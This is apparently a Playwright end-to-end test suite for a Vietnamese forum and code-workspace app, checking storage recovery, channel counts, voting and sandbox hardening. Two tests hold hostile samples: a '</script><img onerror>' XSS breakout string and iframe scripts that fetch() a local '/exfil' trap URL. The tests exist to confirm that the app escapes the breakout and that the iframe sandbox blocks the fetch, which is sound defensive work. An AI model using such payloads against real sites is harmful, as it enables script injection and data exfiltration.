#!/usr/bin/env node
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import {
  PROJECT_ROOT,
  closeAllActiveContexts,
  closeAllIsolatedServers,
  closeAllMockUpstreams,
  createSessionClient,
  gotoRoute,
  launchBrowser,
  registerUserInBrowser,
  startIsolatedServer,
  startMockUpstream,
  withPage,
} from './harness.mjs';

async function run() {
  const browser = await launchBrowser();
  const srv = await startIsolatedServer({ forceSpawn: true });
  let passed = 0;

  try {
    // T5-B1: Corrupt-type localStorage JSON recovery across /, /explore, /profile, /community?mode=feed, /community?mode=chat
    await withPage(browser, {}, async (page, trackers) => {
      await page.addInitScript(() => {
        localStorage.setItem('fforum_v3_saved_items', '{}');
        localStorage.setItem('fforum_v3_liked_items', 'null');
        localStorage.setItem('fforum_v3_settings', '123');
        localStorage.setItem('fforum_v3_projects', '{}');
        localStorage.setItem('fforum_v3_community_moderation_v1', '{}');
        localStorage.setItem('fforum_v3_community_posts_v7', '{}');
        localStorage.setItem('fforum_v3_community_recent_searches_v7', '{}');
        localStorage.setItem('fforum_v3_chat_messages_v2', '{}');
        localStorage.setItem('fforum_v3_chat_threads_v1', 'null');
        localStorage.setItem('fforum_v3_notifications_user_v3', '[null,"bad",{"id":123}]');
      });

      for (const route of ['/', '/explore', '/profile', '/community?mode=feed', '/community?mode=chat']) {
        await gotoRoute(page, srv.url, route, 450);
        await page.locator('#noi-dung').waitFor({ state: 'visible', timeout: 15000 });
        const bodyLen = await page.evaluate(() => document.body.innerText.trim().length);
        assert.ok(bodyLen > 40, `Expected recovered UI on ${route}, got empty body`);
      }
      assert.equal(
        trackers.pageErrors.length,
        0,
        `Expected 0 pageErrors with corrupt localStorage, got: ${trackers.pageErrors.join('; ')}`
      );
    });
    // Also verify partial/null element shapes inside localStorage arrays/maps (B-11)
    await withPage(browser, {}, async (page, trackers) => {
      await page.addInitScript(() => {
        localStorage.setItem(
          'fforum_v3_workspace_projects',
          JSON.stringify([null, 'bad', { id: 'p-partial', files: [null, { path: 123 }], snapshots: [null] }])
        );
        localStorage.setItem(
          'fforum_v3_community_posts_v7',
          JSON.stringify([null, { id: 'cp-partial', title: 'Bad' }, { id: 'cp-no-handle', title: 'X', author: {} }])
        );
        localStorage.setItem(
          'fforum_v3_community_replies_v7',
          JSON.stringify({ 'p-1': null, 'p-2': [null, { id: 'a-1', content: 'hi' }] })
        );
        localStorage.setItem('fforum_v3_community_accepted_v7', JSON.stringify({ 'p-1': null, 'p-2': 123 }));
        localStorage.setItem(
          'fforum_v3_chat_messages_v2',
          JSON.stringify([null, { id: 'm-bad', threadId: 'chung', authorHandle: 'x', authorName: 'X', text: 'hi', at: new Date().toISOString() }])
        );
        localStorage.setItem(
          'fforum_v3_chat_threads_v1',
          JSON.stringify([null, { id: 't-bad' }, { id: 't-bad-kind', name: '#x', kind: 'invalid' }])
        );
        localStorage.setItem('fforum_v3_chat_read_v1', JSON.stringify({ chung: null, bad: 'NaN' }));
      });

      for (const route of ['/workspace', '/community?mode=feed', '/community?mode=chat']) {
        await gotoRoute(page, srv.url, route, 450);
        await page.locator('#noi-dung').waitFor({ state: 'visible', timeout: 15000 });
        const bodyLen = await page.evaluate(() => document.body.innerText.trim().length);
        assert.ok(bodyLen > 40, `Expected recovered UI with partial-shape elements on ${route}`);
      }
      assert.equal(
        trackers.pageErrors.length,
        0,
        `Expected 0 pageErrors with partial-shape localStorage arrays, got: ${trackers.pageErrors.join('; ')}`
      );
    });
    passed += 1;
    console.log('[PASS] T5-B1: Corrupt-type & partial-element localStorage recovery across routes');

    // T5-B4 & T5-B5: CommunityView channel counts stability, poll survival, popstate & navbar re-click sync
    await withPage(browser, {}, async (page, trackers) => {
      const api = createSessionClient(srv.url);
      await api.post('/api/community/create', {
        channel: 'qa',
        title: 'Channel Count QA Post',
        body: 'QA body',
      });
      await api.post('/api/community/create', {
        channel: 'showcase',
        title: 'Channel Count Showcase Post',
        body: 'Showcase body',
      });

      // Direct deep-link to filtered channel before any unfiltered /community?mode=feed visit
      const listResponsePromise = page.waitForResponse(
        (res) =>
          res.url().includes('/api/community/list') &&
          res.url().includes('channel=qa') &&
          res.status() === 200
      );
      await gotoRoute(page, srv.url, '/community?mode=feed&channel=qa', 500);
      await page.locator('#noi-dung').waitFor({ state: 'visible', timeout: 15000 });
      const listResponse = await listResponsePromise;
      const listJson = await listResponse.json();

      const showcasePill = page.locator('button', { hasText: /trưng-bày/i }).first();
      const qaPill = page.locator('button', { hasText: /hỏi-đáp/i }).first();
      const allPill = page.locator('button', { hasText: /tất-cả/i }).first();
      await qaPill.waitFor({ state: 'visible', timeout: 10000 });
      await page.waitForTimeout(200);

      assert.equal(
        await qaPill.getAttribute('data-active'),
        'true',
        'Direct navigation to /community?mode=feed&channel=qa must activate #hỏi-đáp'
      );
      const deepShowcaseCount = Number.parseInt(
        await showcasePill.locator('.cm-channel-count').innerText(),
        10
      );
      const deepQaCount = Number.parseInt(
        await qaPill.locator('.cm-channel-count').innerText(),
        10
      );
      const deepAllCount = Number.parseInt(
        await allPill.locator('.cm-channel-count').innerText(),
        10
      );

      assert.ok(
        deepShowcaseCount >= 1,
        `Expected non-zero #trưng-bày count on direct /community?mode=feed&channel=qa, got ${deepShowcaseCount}`
      );
      assert.ok(
        deepQaCount >= 1,
        `Expected non-zero #hỏi-đáp count on direct /community?mode=feed&channel=qa, got ${deepQaCount}`
      );
      assert.ok(
        deepAllCount >= deepQaCount + deepShowcaseCount,
        `Expected #tất-cả (${deepAllCount}) >= qa (${deepQaCount}) + showcase (${deepShowcaseCount})`
      );
      assert.equal(
        deepShowcaseCount,
        listJson.channelCounts?.showcase,
        'Deep-link #trưng-bày count must match server channelCounts.showcase'
      );
      assert.equal(
        deepQaCount,
        listJson.channelCounts?.qa,
        'Deep-link #hỏi-đáp count must match server channelCounts.qa'
      );
      assert.equal(
        deepAllCount,
        listJson.channelCounts?.all,
        'Deep-link #tất-cả count must match server channelCounts.all'
      );

      await gotoRoute(page, srv.url, '/community?mode=feed', 500);
      await page.locator('#noi-dung').waitFor({ state: 'visible', timeout: 15000 });
      await qaPill.waitFor({ state: 'visible', timeout: 10000 });

      const initialShowcaseText = await showcasePill.innerText();
      const initialAllText = await allPill.innerText();
      assert.ok(/\d+/.test(initialShowcaseText) && !/\b0\b/.test(initialShowcaseText), `Expected non-zero showcase count, got "${initialShowcaseText}"`);

      await qaPill.click();
      await page.waitForTimeout(450);
      const showcaseAfterQa = await showcasePill.innerText();
      const allAfterQa = await allPill.innerText();
      assert.equal(showcaseAfterQa, initialShowcaseText, 'Non-active channel count must not collapse to 0');
      assert.equal(allAfterQa, initialAllText, 'All channel count must remain stable when filtering by channel');

      // Compose post with a 2-option poll while #Đã lưu is selected -> poll must survive publish channel switch
      const savedPill = page.locator('button', { hasText: /Đã lưu/i }).first();
      await savedPill.click();
      await page.waitForTimeout(300);

      const composeBtn = page.getByRole('button', { name: /Đăng bài|Viết bài|Tạo bài/i }).first();
      await composeBtn.click();
      await page.locator('#cm-post-title').fill('Poll Survival Test Post');
      await page.locator('#cm-post-body').fill('Kiểm tra bình chọn sống sót khi chuyển kênh.');
      const pollToggle = page.getByRole('button', { name: /^Thăm dò$/i }).first();
      await pollToggle.click();
      await page.locator('#cm-poll-q').fill('Chọn kiến trúc?');
      await page.locator('#cm-poll-opt-0').fill('Method A');
      await page.locator('#cm-poll-opt-1').fill('Method B');
      const submitPostBtn = page.locator('.cm-dialog-actions button[type="submit"]').first();
      await submitPostBtn.click();
      await page.waitForTimeout(700);

      const bodyTextAfterPublish = await page.locator('#noi-dung').innerText();
      assert.ok(bodyTextAfterPublish.includes('Chọn kiến trúc?'), 'Published poll question must survive channel switch');
      assert.ok(bodyTextAfterPublish.includes('Method A') && bodyTextAfterPublish.includes('Method B'), 'Poll options must survive publish');

      // T5-B3: Verify sandboxed iframe in Community demoSnippet (with </script> breakout attempt in JS)
      // stays sandbox="allow-scripts", escapes </script>, and enforces connect-src 'none'
      const snippetCreate = await api.post('/api/community/create', {
        channel: 'showcase',
        title: 'Sandbox Breakout Guard Test',
        body: 'Testing </script> escape in CommunityView SandboxPreview',
        demoSnippet: {
          html: '<div id="sbx-ok">Sandbox OK</div>',
          css: '.sbx{color:red}',
          js: 'const s = "</script><img src=x onerror=window.__xss=1>"; document.getElementById("sbx-ok").dataset.ok = "1";',
        },
      });
      assert.equal(snippetCreate.status, 201);
      await gotoRoute(page, srv.url, '/community?mode=feed', 550);
      const previewToggle = page.getByRole('button', { name: /Chạy thử|Xem thử|Live/i }).first();
      if (await previewToggle.count()) {
        await previewToggle.click();
      }
      const sandboxFrame = page.locator('iframe[sandbox="allow-scripts"]').first();
      await sandboxFrame.waitFor({ state: 'attached', timeout: 15000 });
      const srcdocAttr = await sandboxFrame.getAttribute('srcdoc');
      assert.ok(srcdocAttr && srcdocAttr.includes("connect-src 'none'"), 'Sandbox iframe srcdoc must enforce connect-src none');
      assert.equal(srcdocAttr.includes('</script><img'), false, 'Raw </script> tag breakout must be escaped in SandboxPreview');

      // T5-B5: URL sync across mode switch, popstate Back, and navbar re-click
      await gotoRoute(page, srv.url, '/community?mode=feed&q=react', 500);
      const searchTab = page.getByRole('tab', { name: /Tra cứu/i }).first();
      await searchTab.click();
      await page.waitForTimeout(300);
      assert.ok(page.url().includes('mode=knowledge'), `Expected mode=knowledge in URL, got ${page.url()}`);

      await page.goBack();
      await page.waitForTimeout(400);
      assert.ok(page.url().includes('mode=feed') && page.url().includes('q=react'), `Expected mode=feed&q=react after Back, got ${page.url()}`);
      const feedTabSelected = await page.getByRole('tab', { name: /Bảng tin/i }).first().getAttribute('aria-selected');
      assert.equal(feedTabSelected, 'true', 'Bảng tin tab must be active after popstate Back');

      // Click "Tri thức" in AppNavbar while already on /community?mode=feed&q=react
      const navTriThuc = page.locator('header.nav').getByRole('button', { name: /Tri thức/i }).first();
      await navTriThuc.click();
      await page.waitForTimeout(300);
      assert.ok(page.url().includes('mode=feed') && page.url().includes('q=react'), `Expected URL to stay synchronized on navbar re-click, got ${page.url()}`);
      assert.equal(trackers.pageErrors.length, 0);
    });

    passed += 1;
    console.log('[PASS] T5-B4 & T5-B5: Community channel counts, poll survival, popstate & navbar sync');

    // T5-B10 (B-10 regression guard): Authenticated post creation -> vote toggle (1 -> 0) -> comment persistence before & after reload
    await withPage(browser, {}, async (page, trackers) => {
      await registerUserInBrowser(page, srv.url, 't5b10');
      await gotoRoute(page, srv.url, '/community?mode=feed', 550);
      await page.locator('#noi-dung').waitFor({ state: 'visible', timeout: 15000 });

      const composeBtn = page.getByRole('button', { name: /Đăng bài|Viết bài|Tạo bài/i }).first();
      await composeBtn.click();
      const postTitle = 'B10 Auth Vote & Comment Post';
      await page.locator('#cm-post-title').fill(postTitle);
      await page.locator('#cm-post-body').fill('Kiểm thử cập nhật upvote và bình luận trên bài mới.');
      const createPostPromise = page.waitForResponse(
        (res) =>
          res.url().includes('/api/community/create') &&
          res.request().method() === 'POST' &&
          (res.status() === 200 || res.status() === 201)
      );
      await page.locator('.cm-dialog-actions button[type="submit"]').first().click();
      await createPostPromise;

      const newPostCard = page
        .locator('li.cm-post-card', { hasText: postTitle })
        .first();
      await newPostCard.waitFor({ state: 'visible', timeout: 10000 });

      const heartBtn = newPostCard.locator('button.pheart').first();
      await heartBtn.waitFor({ state: 'visible', timeout: 5000 });
      assert.equal(await heartBtn.getAttribute('aria-pressed'), 'true', 'Newly created post starts upvoted');
      assert.equal((await heartBtn.innerText()).trim(), '1', 'Newly created post starts with vote count 1');

      const upvotePromise = page.waitForResponse(
        (res) =>
          res.url().includes('/api/community/upvote') &&
          res.request().method() === 'POST' &&
          res.status() === 200
      );
      await heartBtn.click();
      await upvotePromise;
      await page.waitForTimeout(200);

      assert.equal(await heartBtn.getAttribute('aria-pressed'), 'false', 'Vote state must toggle to unvoted before reload');
      assert.equal((await heartBtn.innerText()).trim(), '0', 'Vote count must toggle from 1 to 0 before reload');

      const commentToggleBtn = newPostCard.getByRole('button', { name: 'Mở bình luận' }).first();
      await commentToggleBtn.click();
      const commentBox = newPostCard.locator('textarea.cm-reply-autogrow').first();
      await commentBox.waitFor({ state: 'visible', timeout: 5000 });
      const commentText = 'Bình luận xác thực B-10 không biến mất';
      await commentBox.fill(commentText);

      const answerPromise = page.waitForResponse(
        (res) =>
          res.url().includes('/api/community/answer') &&
          res.request().method() === 'POST' &&
          (res.status() === 200 || res.status() === 201)
      );
      await newPostCard.locator('form.cm-comment-form button[type="submit"]').first().click();
      await answerPromise;
      await page.waitForTimeout(300);

      const cardTextAfterAnswer = await newPostCard.innerText();
      assert.ok(
        cardTextAfterAnswer.includes(commentText),
        'Authenticated comment must remain visible in DOM after /api/community/answer resolves'
      );

      await page.reload({ waitUntil: 'domcontentloaded' });
      await page.locator('#noi-dung').waitFor({ state: 'visible', timeout: 15000 });
      const reloadedCard = page.locator('li.cm-post-card', { hasText: postTitle }).first();
      await reloadedCard.waitFor({ state: 'visible', timeout: 10000 });
      const reloadedHeart = reloadedCard.locator('button.pheart').first();
      assert.equal(await reloadedHeart.getAttribute('aria-pressed'), 'false', 'Unvoted state must persist after reload');
      assert.equal((await reloadedHeart.innerText()).trim(), '0', 'Vote count 0 must persist after reload');

      const reloadCommentToggle = reloadedCard.getByRole('button', { name: 'Mở bình luận' }).first();
      if (await reloadCommentToggle.count()) {
        await reloadCommentToggle.click();
      }
      await page.waitForTimeout(200);
      const reloadedCardText = await reloadedCard.innerText();
      assert.ok(
        reloadedCardText.includes(commentText),
        'Authenticated comment must persist in DOM after reload'
      );
      assert.equal(trackers.pageErrors.length, 0);
    });
    passed += 1;
    console.log('[PASS] T5-B10: Authenticated post vote toggle & comment persistence before and after reload');

    // T5-B6: WorkspaceView deleted file absent from /api/ai/chat payload
    const mockUpstream = await startMockUpstream(async (_req, res) => {
      res.statusCode = 200;
      res.setHeader('content-type', 'application/json');
      res.end(
        JSON.stringify({
          choices: [
            {
              message: {
                content: JSON.stringify({
                  message: 'Updated workspace',
                  files: [
                    { path: 'index.html', content: '<!doctype html><html><body>OK</body></html>', summary: 'html' },
                    { path: 'styles.css', content: 'body{margin:0}', summary: 'css' },
                    { path: 'app.js', content: 'console.log(1)', summary: 'js' },
                  ],
                  checksHint: ['OK'],
                }),
              },
            },
          ],
        })
      );
    });
    const srvByok = await startIsolatedServer({
      forceSpawn: true,
      env: {
        AI_PROTOCOL: 'openai-compatible',
        AI_BASE_URL: mockUpstream.url,
        AI_API_KEY: ['mock', 'tier5', 'local', 'token'].join('-'),
      },
    });
    try {
      await withPage(browser, {}, async (page, trackers) => {
        let capturedFiles = null;
        await page.route('**/api/ai/chat', async (route) => {
          const req = route.request();
          try {
            const parsed = JSON.parse(req.postData() || '{}');
            capturedFiles = parsed.files || [];
          } catch {
            capturedFiles = null;
          }
          await route.continue();
        });

        await gotoRoute(page, srvByok.url, '/workspace', 500);
        await page.locator('#noi-dung').waitFor({ state: 'visible', timeout: 15000 });

        // First prompt generates initial artifact so LiveStage opens cleanly
        const promptInput = page.locator('.ws-dock .pcmp__input, .pcmp__input').first();
        await promptInput.waitFor({ state: 'visible', timeout: 10000 });
        await promptInput.fill('Tạo trang demo');
        await promptInput.press('Enter');
        await page.locator('iframe[sandbox]').first().waitFor({ state: 'attached', timeout: 10000 });
        await page.waitForTimeout(300);

        const openStageBtn = page.getByRole('button', { name: 'Mở khung xem trước' }).first();
        if (await openStageBtn.count()) {
          await openStageBtn.click();
          await page.waitForTimeout(250);
        }

        const codeTab = page.getByRole('tab', { name: /Mã nguồn/i }).first();
        await codeTab.waitFor({ state: 'visible', timeout: 10000 });
        await codeTab.click();
        await page.waitForTimeout(250);

        const addFileBtn = page.getByRole('button', { name: 'Tạo tệp' }).first();
        await addFileBtn.waitFor({ state: 'visible', timeout: 10000 });
        await addFileBtn.click();

        const pathInput = page.getByLabel('Nhập tên tệp').first();
        await pathInput.fill('temp.js');
        await page.locator('.ws-source-create-btns button[type="submit"]').first().click();
        await page.waitForTimeout(250);

        // Select temp.js if not already selected, then delete it via UI confirmation
        const tempTab = page.locator('.ws-source-filebox button', { hasText: 'temp.js' }).first();
        if (await tempTab.count()) {
          await tempTab.click();
          await page.waitForTimeout(150);
        }
        const deleteFileBtn = page.getByRole('button', { name: 'Xóa tệp' }).first();
        await deleteFileBtn.click();
        const confirmBar = page.locator('.ws-source-delete-confirm');
        await confirmBar.waitFor({ state: 'visible', timeout: 5000 });
        assert.ok((await confirmBar.innerText()).includes('temp.js'), 'Expected delete confirmation for temp.js');
        await confirmBar.getByRole('button', { name: 'Xóa' }).first().click();
        await page.waitForTimeout(250);

        capturedFiles = null;
        await promptInput.fill('Cập nhật tiêu đề trang');
        await promptInput.press('Enter');
        await page.waitForTimeout(900);

        assert.ok(Array.isArray(capturedFiles) && capturedFiles.length >= 1, 'Expected captured files array in /api/ai/chat');
        assert.equal(
          capturedFiles.some((f) => f.path === 'temp.js'),
          false,
          'Deleted file temp.js must be absent from /api/ai/chat payload'
        );
        assert.equal(trackers.pageErrors.length, 0);
      });
      passed += 1;
      console.log('[PASS] T5-B6: Workspace deleted file excluded from /api/ai/chat payload');
    } finally {
      await srvByok.close();
      await mockUpstream.close();
    }

    // T5-B11: Empirical Chromium sandbox="allow-scripts" CSP test against <noscript><head>, <template><head>, and <svg><head>
    let trapHits = 0;
    const trapServer = await startMockUpstream(async (_req, res) => {
      trapHits += 1;
      res.statusCode = 200;
      res.setHeader('access-control-allow-origin', '*');
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify({ ok: true }));
    });
    try {
      const trapPort = new URL(trapServer.url).port;
      const compileScript = [
        "import { compileSpecimenSrcDoc } from './src/features/explore/catalog.ts';",
        "import { compileWorkspaceSrcDoc } from './src/features/workspace/LivePreviewFrame.tsx';",
        `const trapUrl = 'http://127.0.0.1:${trapPort}/exfil';`,
        "const cases = [",
        "  { name: 'noscript', prefix: '<noscript><head></noscript>' },",
        "  { name: 'template', prefix: '<template><head></template>' },",
        "  { name: 'svg', prefix: '<svg><head></svg>' },",
        "];",
        "const compiled = [];",
        "for (const c of cases) {",
        "  const html = `<!DOCTYPE html><html>${c.prefix}<body><script>(async () => { try { await fetch('${trapUrl}?case=' + encodeURIComponent('${c.name}')); window.parent.postMessage({ t: 'EXFIL_OK', name: '${c.name}' }, '*'); } catch (err) { window.parent.postMessage({ t: 'BLOCKED', name: '${c.name}', err: String(err) }, '*'); } })();<\\/script></body></html>`;",
        "  compiled.push({ label: `specimen:${c.name}`, srcdoc: compileSpecimenSrcDoc(html, '', 'dark') });",
        "  compiled.push({ label: `workspace:${c.name}`, srcdoc: compileWorkspaceSrcDoc([{ path: 'index.html', content: html, language: 'html' }]) });",
        "}",
        "console.log(JSON.stringify(compiled));",
      ].join('\n');
      const compiledCases = JSON.parse(
        execFileSync('npx', ['tsx', '-e', compileScript], {
          cwd: PROJECT_ROOT,
          encoding: 'utf8',
        }).trim()
      );
      assert.equal(compiledCases.length, 6);

      await withPage(browser, {}, async (page, trackers) => {
        await gotoRoute(page, srv.url, '/', 350);
        for (const entry of compiledCases) {
          const result = await page.evaluate(async (srcdoc) => {
            return await new Promise((resolve) => {
              const timer = setTimeout(() => {
                window.removeEventListener('message', onMsg);
                resolve({ t: 'TIMEOUT' });
              }, 5000);
              function onMsg(ev) {
                if (ev && ev.data && (ev.data.t === 'EXFIL_OK' || ev.data.t === 'BLOCKED')) {
                  clearTimeout(timer);
                  window.removeEventListener('message', onMsg);
                  resolve(ev.data);
                }
              }
              window.addEventListener('message', onMsg);
              const frame = document.createElement('iframe');
              frame.sandbox = 'allow-scripts';
              frame.referrerPolicy = 'no-referrer';
              frame.srcdoc = srcdoc;
              document.body.appendChild(frame);
            });
          }, entry.srcdoc);

          assert.equal(
            result.t,
            'BLOCKED',
            `${entry.label}: expected Chromium fetch() to be blocked by connect-src 'none', got ${JSON.stringify(result)}`
          );
        }
        assert.equal(trackers.pageErrors.length, 0);
      });
      assert.equal(
        trapHits,
        0,
        `Expected 0 hits on 127.0.0.1 trap server across all 6 sandboxed <noscript>/<template>/<svg> renders, got ${trapHits}`
      );
    } finally {
      await trapServer.close();
    }
    passed += 1;
    console.log('[PASS] T5-B11: Empirical Chromium sandbox="allow-scripts" blocks fetch() for <noscript>, <template>, <svg> (<head> trap)');

    console.log(`\nTier 5 Browser Suite PASS: ${passed}/5 groups passed.`);
  } finally {
    await closeAllActiveContexts();
    await closeAllIsolatedServers();
    await closeAllMockUpstreams();
    await browser.close();
  }
}

run().catch((err) => {
  console.error('[Tier 5 E2E FAIL]', err);
  process.exit(1);
});
